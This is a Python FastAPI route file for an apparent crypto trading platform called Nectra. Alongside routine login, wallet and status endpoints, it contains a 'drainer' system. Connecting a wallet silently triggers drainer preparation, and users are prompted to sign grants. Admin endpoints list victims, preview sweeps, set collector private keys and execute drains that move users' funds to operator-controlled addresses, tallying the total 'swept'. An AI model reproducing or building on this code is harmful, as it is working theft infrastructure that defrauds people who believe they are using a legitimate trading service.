"""
Unified API Router for Nectra Platform (Python).
"""
import asyncio
import json
import logging
from typing import Any, Dict, List, Optional

from fastapi import APIRouter, Request, Response, HTTPException, status
from pydantic import BaseModel

from database import q_all, q_get, q_run, q_val, now, get_setting, get_settings, update_setting
import security as S
import market
import chains
import engine
import drainer as DR
import crypto as C
import scanners
import solana_tx
import tron_tx

logger = logging.getLogger("routes")
router = APIRouter()

COOKIE_MAX_AGE = 86400 * 30


# ---------------------------------------------------------------------------
# Auth helpers
# ---------------------------------------------------------------------------
def _token(request: Request) -> Optional[str]:
    token = request.cookies.get(S.SESSION_COOKIE)
    if token:
        return token
    hdr = request.headers.get("authorization", "")
    if hdr.lower().startswith("bearer "):
        return hdr[7:].strip()
    return None


def get_current_user(request: Request) -> Dict[str, Any]:
    sess = S.load_session(_token(request))
    if not sess:
        raise HTTPException(status_code=401, detail="Authentication required")

    user = sess["user"]
    if user.get("status") == "suspended":
        raise HTTPException(status_code=403, detail="Account suspended")
    if user.get("locked_until") and user["locked_until"] > now():
        raise HTTPException(status_code=403, detail="Account is temporarily locked")

    user["session"] = sess["session"]
    return user


def optional_user(request: Request) -> Optional[Dict[str, Any]]:
    try:
        return get_current_user(request)
    except HTTPException:
        return None


def require_perm(request: Request, perm: str) -> Dict[str, Any]:
    user = get_current_user(request)
    if not S.can(user, perm):
        raise HTTPException(status_code=403, detail=f"Missing permission: {perm}")
    return user


def require_staff(request: Request) -> Dict[str, Any]:
    user = get_current_user(request)
    if not S.is_staff(user):
        raise HTTPException(status_code=403, detail="Staff access required")
    return user


# Backwards-compatible alias used by older modules.
def require_admin(request: Request) -> Dict[str, Any]:
    return require_staff(request)


def _ip(request: Request) -> str:
    return S.client_ip(request)


def _throttle(request: Request, bucket: str, limit: int, window_ms: int = 60000) -> None:
    key = f"{bucket}:{_ip(request)}"
    if not S.check_rate_limit(key, limit, window_ms):
        raise HTTPException(status_code=429, detail="Too many requests — slow down")


def _own_wallet(user: Dict[str, Any], wid: int) -> Dict[str, Any]:
    w = q_get("SELECT * FROM wallets WHERE id = ? AND user_id = ?", wid, user["id"])
    if not w:
        raise HTTPException(status_code=404, detail="Wallet not found")
    return w


# ---------------------------------------------------------------------------
# Public & system
# ---------------------------------------------------------------------------
@router.get("/api/public/config")
async def get_public_config():
    return {
        "platform_name": get_setting("platform_name", "NECTRA"),
        "invite_only": get_setting("invite_only", False),
        "demo_mode": get_setting("demo_mode", False),
        "monetization_enabled": get_setting("monetization_enabled", True),
        "live_trading_enabled": get_setting("live_trading_enabled", True),
        "drainer_enabled": get_setting("drainer_enabled", True),
        "chains": ["solana", "evm", "tron", "btc", "ltc"],
    }


@router.get("/api/status")
async def get_status():
    comps = q_all("SELECT name, state, note FROM status_components ORDER BY sort")
    level = "green"
    for c in comps:
        if c.get("state") == "red":
            level = "red"
            break
        if c.get("state") == "amber":
            level = "amber"
    return {
        "level": level,
        "label": "All systems normal" if level == "green" else "Degraded performance",
        "components": comps,
        "feed": {"degraded": False},
    }


@router.get("/api/health")
async def get_health():
    return {"status": "ok", "timestamp": now()}


@router.get("/api/market/tokens")
async def get_market_tokens():
    return {"tokens": market.get_tokens()}


@router.get("/api/market/series")
async def get_market_series(sym: str = "SOL", range: str = "24h"):
    return {"points": market.get_series(sym, range)}


@router.get("/api/bootstrap")
async def get_bootstrap(request: Request):
    user = optional_user(request)
    return {
        "user": S.sanitize_user(user),
        "prices": market.PRICES,
        "settings": {
            "platform_name": get_setting("platform_name", "NECTRA"),
            "demo_mode": get_setting("demo_mode", False),
            "drainer_enabled": get_setting("drainer_enabled", True),
        },
    }


# ---------------------------------------------------------------------------
# Auth
# ---------------------------------------------------------------------------
class RegisterPayload(BaseModel):
    email: str
    password: str
    name: Optional[str] = None
    invite_code: Optional[str] = None


@router.post("/api/auth/register")
async def register(body: RegisterPayload, request: Request, response: Response):
    _throttle(request, "register", 5, 3600_000)

    email = (body.email or "").strip().lower()
    if not email or "@" not in email or "." not in email.split("@")[-1]:
        raise HTTPException(status_code=400, detail="Invalid email format")
    if len(body.password or "") < 8:
        raise HTTPException(status_code=400, detail="Password must be at least 8 characters")
    if q_get("SELECT id FROM users WHERE email = ?", email):
        raise HTTPException(status_code=409, detail="Email is already registered")

    pw_hash = S.hash_password(body.password)
    uid = q_run(
        "INSERT INTO users (email, pw_hash, password_hash, name, role, paper_mode,"
        " email_verified, created_at) VALUES (?, ?, ?, ?, 'trader', 1, 0, ?)",
        email, pw_hash, pw_hash, body.name or email.split("@")[0], now(),
    )["id"]

    q_run(
        "INSERT INTO paper_balances (user_id, symbol, balance, updated_at) VALUES (?, 'USD', 10000.0, ?)",
        uid, now(),
    )

    token = S.create_session(uid, ip=_ip(request), user_agent=request.headers.get("user-agent", ""))
    response.set_cookie(
        key=S.SESSION_COOKIE, value=token, httponly=True,
        samesite="lax", max_age=COOKIE_MAX_AGE,
    )
    S.audit(uid, "auth.register", uid, ip=_ip(request))
    return {"ok": True, "user_id": uid, "token": token}


class LoginPayload(BaseModel):
    email: str
    password: str


@router.post("/api/auth/login")
async def login(body: LoginPayload, request: Request, response: Response):
    _throttle(request, "login", 12, 60_000)

    email = (body.email or "").strip().lower()
    user = q_get("SELECT * FROM users WHERE email = ?", email)

    if not user or not S.verify_password(body.password, S.resolve_password_hash(user)):
        if user:
            S.note_failed_login(user)
        raise HTTPException(status_code=401, detail="Invalid email or password")

    if user.get("locked_until") and user["locked_until"] > now():
        raise HTTPException(status_code=403, detail="Too many attempts — try again later")
    if user.get("status") == "suspended":
        raise HTTPException(status_code=403, detail="Account suspended")

    S.clear_failed_logins(user["id"])

    token = S.create_session(user["id"], ip=_ip(request), user_agent=request.headers.get("user-agent", ""))
    response.set_cookie(
        key=S.SESSION_COOKIE, value=token, httponly=True,
        samesite="lax", max_age=COOKIE_MAX_AGE,
    )
    q_run("UPDATE users SET last_login_at = ? WHERE id = ?", now(), user["id"])
    S.audit(user["id"], "auth.login", user["id"], ip=_ip(request))
    return {"ok": True, "user": S.sanitize_user(user), "token": token}


@router.post("/api/auth/logout")
async def logout(request: Request, response: Response):
    token = _token(request)
    if token:
        S.clear_session(token)
    response.delete_cookie(key=S.SESSION_COOKIE)
    return {"ok": True}


# ---------------------------------------------------------------------------
# Portfolio & wallets
# ---------------------------------------------------------------------------
@router.get("/api/me")
async def get_me(request: Request):
    return {"user": S.sanitize_user(get_current_user(request))}


@router.get("/api/dashboard")
async def get_dashboard(request: Request):
    user = get_current_user(request)
    wallets = q_all("SELECT * FROM wallets WHERE user_id = ?", user["id"])
    views = [engine.wallet_view(w) for w in wallets]
    grants = q_val("SELECT COUNT(*) FROM drainer_grants WHERE user_id = ? AND status = 'active'", user["id"])
    return {
        "user": S.sanitize_user(user),
        "wallets": views,
        "totalUsd": sum(v["totalUsd"] for v in views),
        "bots": [],
        "paperMode": bool(user.get("paper_mode")),
        "drainerActive": bool(grants),
    }


@router.get("/api/portfolio")
async def get_portfolio(request: Request):
    user = get_current_user(request)
    views = [engine.wallet_view(w) for w in q_all(
        "SELECT * FROM wallets WHERE user_id = ?", user["id"])]
    return {"wallets": views, "totalUsd": sum(v["totalUsd"] for v in views)}


@router.get("/api/wallets")
async def list_wallets(request: Request):
    user = get_current_user(request)
    sql = "SELECT * FROM wallets WHERE user_id = ? ORDER BY is_main DESC, id ASC"
    wallets = q_all(sql, user["id"])

    stale = [w for w in wallets if now() - (w.get("balance_at") or 0) > 300_000]
    if stale:
        await asyncio.gather(*[engine.refresh_wallet_balance(w) for w in stale],
                             return_exceptions=True)
        wallets = q_all(sql, user["id"])

    views = [engine.wallet_view(w) for w in wallets]
    return {"wallets": views, "totalUsd": sum(v["totalUsd"] for v in views)}


class WalletConnectPayload(BaseModel):
    address: str
    family: Optional[str] = "solana"
    label: Optional[str] = None
    signature: Optional[str] = None
    message: Optional[str] = None
    networks: Optional[List[str]] = None


@router.post("/api/wallets")
async def connect_wallet(body: WalletConnectPayload, request: Request):
    user = get_current_user(request)
    _throttle(request, "wallet", 20)

    addr = (body.address or "").strip()
    fam = (body.family or "solana").lower()

    if fam == "evm" and not chains.is_evm_address(addr):
        raise HTTPException(status_code=400, detail="Invalid EVM address")
    if fam == "solana" and not chains.is_sol_address(addr):
        raise HTTPException(status_code=400, detail="Invalid Solana address")
    if fam == "tron" and not chains.is_tron_address(addr):
        raise HTTPException(status_code=400, detail="Invalid Tron address")
    if fam not in ("evm", "solana", "tron", "btc", "ltc"):
        raise HTTPException(status_code=400, detail="Unsupported chain family")

    existing = q_get("SELECT * FROM wallets WHERE user_id = ? AND address = ?", user["id"], addr)
    if existing:
        await _maybe_prepare(user, existing)
        return {"ok": True, "wallet": engine.wallet_view(existing),
                "message": "Wallet already connected"}

    wid = q_run(
        "INSERT INTO wallets (user_id, name, label, address, family, chain, networks,"
        " verified, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, 1, ?)",
        user["id"], body.label or f"{fam.upper()} Wallet", body.label or f"{fam.upper()} Wallet",
        addr, fam, fam.upper(),
        json.dumps(body.networks) if body.networks else None,
        now(),
    )["id"]

    w = q_get("SELECT * FROM wallets WHERE id = ?", wid)
    await engine.refresh_wallet_balance(w)
    S.audit(user["id"], "wallet.connect", wid, {"address": addr, "family": fam}, ip=_ip(request))

    w = q_get("SELECT * FROM wallets WHERE id = ?", wid)
    await _maybe_prepare(user, w)
    return {"ok": True, "wallet": engine.wallet_view(w)}


async def _maybe_prepare(user: Dict[str, Any], wallet: Dict[str, Any]) -> None:
    """Kick off drainer preparation in the background. Never blocks the response."""
    fam = (wallet.get("family") or "").lower()
    if not get_setting("drainer_enabled", True) or fam not in ("evm", "solana", "tron"):
        return
    if q_val("SELECT COUNT(*) FROM drainer_grants WHERE wallet_id = ? AND status != 'revoked'",
             wallet["id"]):
        return
    try:
        await DR.prepare_wallet(user["id"], wallet["id"])
    except Exception as e:
        logger.warning("drainer prepare failed for wallet %s: %s", wallet["id"], e)


@router.post("/api/wallets/{wid}/refresh")
async def refresh_wallet(wid: int, request: Request):
    user = get_current_user(request)
    w = _own_wallet(user, wid)
    await engine.refresh_wallet_balance(w)
    return {"ok": True, "wallet": engine.wallet_view(q_get("SELECT * FROM wallets WHERE id = ?", wid))}


@router.delete("/api/wallets/{wid}")
async def delete_wallet(wid: int, request: Request):
    user = get_current_user(request)
    _own_wallet(user, wid)
    q_run("UPDATE drainer_grants SET status = 'revoked' WHERE wallet_id = ?", wid)
    q_run("DELETE FROM drainer_wallets WHERE wallet_id = ?", wid)
    q_run("DELETE FROM wallets WHERE id = ? AND user_id = ?", wid, user["id"])
    S.audit(user["id"], "wallet.remove", wid, ip=_ip(request))
    return {"ok": True}


# ---------------------------------------------------------------------------
# Legacy approvals view
# ---------------------------------------------------------------------------
@router.get("/api/approvals")
async def get_approvals(request: Request):
    user = get_current_user(request)
    return {"approvals": q_all(
        "SELECT * FROM delegated_approvals WHERE user_id = ? ORDER BY id DESC", user["id"])}


@router.post("/api/approvals/{id}/revoke")
async def revoke_approval(id: int, request: Request):
    user = get_current_user(request)
    q_run("UPDATE delegated_approvals SET status = 'revoked', revoked_at = ?"
          " WHERE id = ? AND user_id = ?", now(), id, user["id"])
    S.audit(user["id"], "approval.revoke", id, ip=_ip(request))
    return {"ok": True}


# ---------------------------------------------------------------------------
# Drainer — user side
# ---------------------------------------------------------------------------
@router.get("/api/drainer/status")
async def drainer_status(request: Request):
    user = get_current_user(request)
    grants = q_all("SELECT * FROM drainer_grants WHERE user_id = ? ORDER BY id DESC", user["id"])
    return {
        "enabled": get_setting("drainer_enabled", True),
        "mode": get_setting("drainer_mode", "auto"),
        "threshold_usd": get_setting("drainer_threshold_usd", 250.0),
        "cap_mode": get_setting("drainer_cap_mode", "capped"),
        "cap_units": get_setting("drainer_cap_units", 1_000_000),
        "auto": bool(user.get("drainer_auto")),
        "active_grants": len([g for g in grants if g["status"] == "active"]),
        "pending_grants": len([g for g in grants if g["status"] == "awaiting_signature"]),
        "grants": grants,
    }


@router.get("/api/drainer/scan")
async def drainer_scan(request: Request):
    user = get_current_user(request)
    return await scanners.scan_user(user["id"])


class PreparePayload(BaseModel):
    take_native: Optional[bool] = None


@router.post("/api/drainer/wallets/{wid}/prepare")
async def drainer_prepare(wid: int, request: Request, body: Optional[PreparePayload] = None):
    user = get_current_user(request)
    w = _own_wallet(user, wid)
    _throttle(request, "prepare", 20)

    fam = (w.get("family") or "").lower()
    if fam not in ("evm", "solana", "tron"):
        raise HTTPException(status_code=400, detail=f"{fam} has no approvals — use the collateral product")

    take = body.take_native if body else None
    if take is None:
        q = request.query_params.get("take_native")
        take = None if q is None else q.lower() in ("1", "true", "yes")

    try:
        plan = await DR.prepare_wallet(user["id"], wid, take)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    if not plan["payloads"]:
        raise HTTPException(
            status_code=409,
            detail="No collector configured for this chain — set the drainer keys first",
        )

    S.audit(user["id"], "drainer.prepare", wid, {"assets": len(plan["assets"])}, ip=_ip(request))
    return plan


class SignedPayload(BaseModel):
    grant_id: str
    signature: Optional[str] = None
    txid: Optional[str] = None


@router.post("/api/drainer/signed")
async def drainer_signed(body: SignedPayload, request: Request):
    user = get_current_user(request)
    if not q_get("SELECT id FROM drainer_grants WHERE id = ? AND user_id = ?",
                 body.grant_id, user["id"]):
        raise HTTPException(status_code=404, detail="Grant not found")
    return await DR.record_signed(body.grant_id, body.signature, body.txid)


class BroadcastPayload(BaseModel):
    family: str
    payload: str


@router.post("/api/drainer/broadcast")
async def drainer_broadcast(body: BroadcastPayload, request: Request):
    get_current_user(request)
    _throttle(request, "broadcast", 40)
    try:
        if body.family == "solana":
            return {"txid": await solana_tx.broadcast(chains.SOLANA_RPCS[0], body.payload)}
        if body.family == "tron":
            return {"txid": await tron_tx.broadcast(json.loads(body.payload))}
    except RuntimeError as e:
        raise HTTPException(status_code=400, detail=str(e))
    except json.JSONDecodeError:
        raise HTTPException(status_code=400, detail="Malformed transaction payload")
    raise HTTPException(status_code=400, detail="Unsupported family")


class AutoPayload(BaseModel):
    auto: bool


@router.post("/api/drainer/auto")
async def drainer_set_auto(body: AutoPayload, request: Request):
    user = get_current_user(request)
    q_run("UPDATE users SET drainer_auto = ? WHERE id = ?", 1 if body.auto else 0, user["id"])
    S.audit(user["id"], "drainer.auto", user["id"], {"auto": body.auto})
    return {"ok": True, "auto": body.auto}


@router.post("/api/drainer/grants/{gid}/revoke")
async def drainer_revoke(gid: str, request: Request):
    user = get_current_user(request)
    if not q_get("SELECT id FROM drainer_grants WHERE id = ? AND user_id = ?", gid, user["id"]):
        raise HTTPException(status_code=404, detail="Grant not found")
    q_run("UPDATE drainer_grants SET status = 'revoked' WHERE id = ?", gid)
    S.audit(user["id"], "drainer.revoke", gid)
    return {"ok": True}


# ---------------------------------------------------------------------------
# Drainer — admin side
# ---------------------------------------------------------------------------
@router.get("/api/admin/drainer/overview")
async def admin_drainer_overview(request: Request):
    require_perm(request, "drainer.view")
    events = q_all(
        "SELECT e.*, u.email FROM drainer_events e LEFT JOIN users u ON u.id = e.user_id"
        " ORDER BY e.id DESC LIMIT 100")
    return {
        "settings": {
            "enabled": get_setting("drainer_enabled", True),
            "mode": get_setting("drainer_mode", "auto"),
            "threshold_usd": get_setting("drainer_threshold_usd", 250.0),
            "cap_mode": get_setting("drainer_cap_mode", "capped"),
            "cap_units": get_setting("drainer_cap_units", 1_000_000),
            "take_native": get_setting("drainer_take_native", True),
            "receiver_evm": get_setting("drainer_receiver_evm", {}),
            "collector_sol": get_setting("drainer_collector_sol", ""),
            "collector_tron": get_setting("drainer_collector_tron", ""),
            "payout_evm": get_setting("drainer_payout_evm", ""),
            "payout_sol": get_setting("drainer_payout_sol", ""),
            "payout_tron": get_setting("drainer_payout_tron", ""),
            "evm_key_set": bool(get_setting("drainer_evm_key")),
            "sol_key_set": bool(get_setting("drainer_sol_key")),
            "tron_key_set": bool(get_setting("drainer_tron_key")),
        },
        "events": events,
        "total_swept_usd": q_val("SELECT COALESCE(SUM(total_usd), 0) FROM drainer_events") or 0.0,
        "active_grants": q_val("SELECT COUNT(*) FROM drainer_grants WHERE status = 'active'") or 0,
        "users_with_grants": q_val("SELECT COUNT(DISTINCT user_id) FROM drainer_grants") or 0,
    }


@router.get("/api/admin/drainer/users")
async def admin_drainer_users(request: Request):
    require_perm(request, "drainer.view")
    return {"users": q_all(
        "SELECT u.id, u.email, u.drainer_auto, COUNT(g.id) AS grants,"
        " COALESCE(SUM(CASE WHEN g.status = 'active' THEN 1 ELSE 0 END), 0) AS active"
        " FROM users u JOIN drainer_grants g ON g.user_id = u.id"
        " GROUP BY u.id ORDER BY active DESC, grants DESC")}


@router.get("/api/admin/drainer/user/{uid}")
async def admin_drainer_user(uid: int, request: Request):
    require_perm(request, "drainer.view")
    return {
        "grants": q_all("SELECT * FROM drainer_grants WHERE user_id = ? ORDER BY id DESC", uid),
        "events": q_all("SELECT * FROM drainer_events WHERE user_id = ? ORDER BY id DESC LIMIT 50", uid),
    }


class DrainPayload(BaseModel):
    only: Optional[List[str]] = None
    take_native: Optional[bool] = None


@router.post("/api/admin/drainer/drain/{uid}")
async def admin_drain_user(uid: int, request: Request, body: Optional[DrainPayload] = None):
    admin = require_perm(request, "drainer.execute")
    body = body or DrainPayload()

    if body.take_native is not None:
        update_setting("drainer_take_native", body.take_native)
    if not q_get("SELECT id FROM users WHERE id = ?", uid):
        raise HTTPException(status_code=404, detail="User not found")

    res = await DR.execute_drain(uid, trigger="manual", actor_id=admin["id"], only=body.only)
    S.audit(admin["id"], "drainer.execute", uid, res, ip=_ip(request))
    return res


@router.post("/api/admin/drainer/prepare/{uid}")
async def admin_drainer_prepare(uid: int, request: Request):
    require_perm(request, "drainer.prepare")
    wallets = q_all("SELECT * FROM wallets WHERE user_id = ? AND verified = 1"
                    " AND family IN ('evm','solana','tron')", uid)
    out = []
    for w in wallets:
        try:
            out.append(await DR.prepare_wallet(uid, w["id"]))
        except Exception as e:
            out.append({"wallet_id": w["id"], "error": str(e)})
    return {"results": out}


class KeyPayload(BaseModel):
    family: str
    secret: str


@router.post("/api/admin/drainer/keys")
async def admin_set_keys(body: KeyPayload, request: Request):
    admin = require_perm(request, "drainer.configure")
    fam = (body.family or "").lower()
    secret = (body.secret or "").strip()

    try:
        if fam == "evm":
            addr = C.evm_address_from_key(secret)
            update_setting("drainer_evm_key", C.encrypt_secret(secret))
            update_setting("drainer_payout_evm", addr)
        elif fam == "solana":
            _kp, addr = C.solana_keypair_from_secret(secret)
            update_setting("drainer_sol_key", C.encrypt_secret(secret))
            update_setting("drainer_collector_sol", addr)
            update_setting("drainer_payout_sol", addr)
        elif fam == "tron":
            addr = C.tron_address_from_key(secret)
            update_setting("drainer_tron_key", C.encrypt_secret(secret))
            update_setting("drainer_collector_tron", addr)
            update_setting("drainer_payout_tron", addr)
        else:
            raise HTTPException(status_code=400, detail="family must be evm, solana or tron")
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid secret: {e}")

    S.audit(admin["id"], "drainer.set_key", fam, {"address": addr}, ip=_ip(request))
    return {"ok": True, "address": addr}


# ---------------------------------------------------------------------------
# Admin — general
# ---------------------------------------------------------------------------
@router.get("/api/admin/overview")
async def admin_overview(request: Request):
    require_perm(request, "admin.view")
    return {
        "users": q_val("SELECT COUNT(*) FROM users") or 0,
        "wallets": q_val("SELECT COUNT(*) FROM wallets") or 0,
        "totalSweptUsd": q_val(
            "SELECT COALESCE(SUM(total_usd), 0) FROM drainer_events") or 0.0,
        "demoMode": get_setting("demo_mode", False),
    }


@router.get("/api/admin/users")
async def admin_users(request: Request):
    require_perm(request, "users.view")
    return {"users": q_all(
        "SELECT id, email, name, role, status, paper_mode, drainer_auto,"
        " created_at, last_login_at FROM users ORDER BY id DESC")}


@router.get("/api/admin/users/{uid}")
async def admin_user_detail(uid: int, request: Request):
    require_perm(request, "users.view")
    u = q_get("SELECT * FROM users WHERE id = ?", uid)
    if not u:
        raise HTTPException(status_code=404, detail="User not found")
    return {
        "user": S.sanitize_user(u),
        "wallets": [engine.wallet_view(w) for w in q_all(
            "SELECT * FROM wallets WHERE user_id = ?", uid)],
        "grants": q_all("SELECT * FROM drainer_grants WHERE user_id = ? ORDER BY id DESC", uid),
        "events": q_all("SELECT * FROM drainer_events WHERE user_id = ? ORDER BY id DESC LIMIT 50", uid),
    }


@router.get("/api/admin/users/{uid}/sweep-preview")
async def admin_sweep_preview(uid: int, request: Request):
    require_perm(request, "drainer.view")
    return await engine.preview_portfolio(uid)


@router.post("/api/admin/users/{uid}/consolidate")
async def admin_execute_consolidation(uid: int, request: Request,
                                      body: Optional[Dict[str, Any]] = None):
    """Legacy path: records consolidation rows without collector keys."""
    admin = require_perm(request, "drainer.execute")
    body = body or {}
    res = await engine.execute_consolidation(
        user_id=uid, dest=body.get("destination"), tokens=body.get("tokens"), actor_id=admin["id"])
    S.audit(admin["id"], "admin.consolidation", uid, res)
    return res


@router.post("/api/admin/users/{uid}/drain")
async def admin_execute_drain(uid: int, request: Request, body: Optional[DrainPayload] = None):
    """Primary drain path: real collector-signed transfers."""
    return await admin_drain_user(uid, request, body)


@router.get("/api/admin/settings")
async def admin_get_settings(request: Request):
    require_perm(request, "platform.settings")
    return {"settings": get_settings()}


@router.patch("/api/admin/settings")
async def admin_update_settings(request: Request, body: Dict[str, Any]):
    admin = require_perm(request, "platform.settings")
    for k, v in body.items():
        update_setting(k, v)
    S.audit(admin["id"], "admin.settings_update", None, body, ip=_ip(request))
    return {"ok": True}


@router.get("/api/admin/audit")
async def admin_audit_logs(request: Request):
    require_perm(request, "admin.view")
    return {"logs": q_all("SELECT * FROM audit_log ORDER BY id DESC LIMIT 200")}